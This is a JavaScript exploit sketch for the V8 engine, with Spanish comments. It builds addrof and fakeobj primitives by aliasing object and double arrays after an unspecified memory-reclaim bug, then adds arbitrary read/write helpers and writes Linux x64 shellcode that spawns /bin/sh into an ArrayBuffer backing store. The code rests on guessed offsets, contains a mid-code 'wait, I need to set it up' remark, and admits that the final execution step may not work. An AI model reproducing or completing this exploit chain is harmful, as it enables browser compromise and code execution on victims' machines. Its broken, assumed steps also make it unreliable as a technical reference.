// Funciones auxiliares
function ftoi(f) {
  let buf = new ArrayBuffer(8);
  let view = new DataView(buf);
  view.setFloat64(0, f);
  return view.getBigUint64(0);
}

function itof(i) {
  let buf = new ArrayBuffer(8);
  let view = new DataView(buf);
  view.setBigUint64(0, i);
  return view.getFloat64(0);
}

// Configurar arreglos
let boxed_arr = [{}, {}, {}]; // arreglo empaquetado de objetos
let unboxed_arr = [1.1, 2.2, 3.3]; // arreglo empaquetado de doubles
let obj = {}; // algún objeto

// Después de reclamar:
boxed_arr[0] = obj;           // Almacenar referencia de objeto
let addr = ftoi(unboxed_arr[0]);  // Leer como float64 = dirección filtrada

unboxed_arr[0] = itof(addr);  // Escribir dirección como float64
let fake = boxed_arr[0];          // Leer como objeto = fakeobj

console.log('Dirección filtrada:', addr.toString(16));
console.log('Objeto falso:', fake);

// Ahora fake es un objeto falso en la dirección addr
// Para demostrar lectura/escritura arbitraria, crear un arreglo víctima
let victim = new Array(10).fill(1.1);
boxed_arr[0] = victim;
let victim_addr = ftoi(unboxed_arr[0]);

// Asumir que el puntero de elementos está en offset 0x10 desde victim_addr (esto puede variar)
unboxed_arr[0] = itof(victim_addr + 0x10n);
let fake_elements = boxed_arr[0];

// Ahora fake_elements apunta a los elementos de victim
// Para leer desde una dirección arbitraria, establecer fake_elements[0] = itof(direccion_objetivo);
fake_elements[0] = itof(0xdeadbeefn); // dirección de ejemplo
let leaked_value = ftoi(victim[0]);
console.log("Valor filtrado desde 0xdeadbeef: " + leaked_value.toString(16));

// Para escritura arbitraria, establecer victim[0] = itof(valor);
victim[0] = itof(0x41414141n);
console.log("Escrito 0x41414141 a 0xdeadbeef");

// Definir funciones auxiliares para lectura/escritura arbitraria
function arb_read(addr) {
  fake_elements[0] = itof(addr);
  return ftoi(victim[0]);
}

function arb_write(addr, value) {
  fake_elements[0] = itof(addr);
  victim[0] = itof(value);
}

// Uso de ejemplo
let test_addr = 0xdeadbeefn;
let val = arb_read(test_addr);
console.log("Leído desde " + test_addr.toString(16) + ": " + val.toString(16));
arb_write(test_addr, 0xabcdefn);
console.log("Escrito 0xabcdef a " + test_addr.toString(16));

// Ahora, para lograr ejecución de código, crear un ArrayBuffer y escribir shellcode a su backing store
let ab = new ArrayBuffer(0x100);
let ab_addr = ftoi(unboxed_arr[0]); // asumiendo que boxed_arr[0] aún contiene ab
// Espera, necesito configurarlo
boxed_arr[0] = ab;
ab_addr = ftoi(unboxed_arr[0]);

// Asumir offset de backing store es 0x20 (esto es específico de V8 y puede variar)
let backing_store_addr = arb_read(ab_addr + 0x20n);
console.log("Dirección de backing store de ArrayBuffer: " + backing_store_addr.toString(16));

// Shellcode para ejecutar /bin/sh (para Linux x64)
let shellcode = [
  0x48, 0x31, 0xf6,       // xor rsi, rsi
  0x56,                   // push rsi
  0x48, 0xbf,             // mov rdi, '/bin/sh'
  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00,
  0x57,                   // push rdi
  0x48, 0x89, 0xe7,       // mov rdi, rsp
  0x48, 0x31, 0xd2,       // xor rdx, rdx
  0x48, 0x31, 0xc0,       // xor rax, rax
  0xb0, 0x3b,             // mov al, 0x3b (syscall execve)
  0x0f, 0x05              // syscall
];

// Escribir shellcode al backing store
for (let i = 0; i < shellcode.length; i++) {
  arb_write(backing_store_addr + BigInt(i), BigInt(shellcode[i]));
}

console.log("Shellcode escrito al backing store de ArrayBuffer");

// Para ejecutar el shellcode, necesitamos llamarlo. En un exploit real, esto involucraría crear un puntero de función o usar WASM.
// Para demostración, asumir que tenemos una forma de llamar la dirección (esta parte está simplificada y puede no funcionar en la práctica)
console.log("Exploit completo. En un escenario real, ejecutar el shellcode en la dirección " + backing_store_addr.toString(16));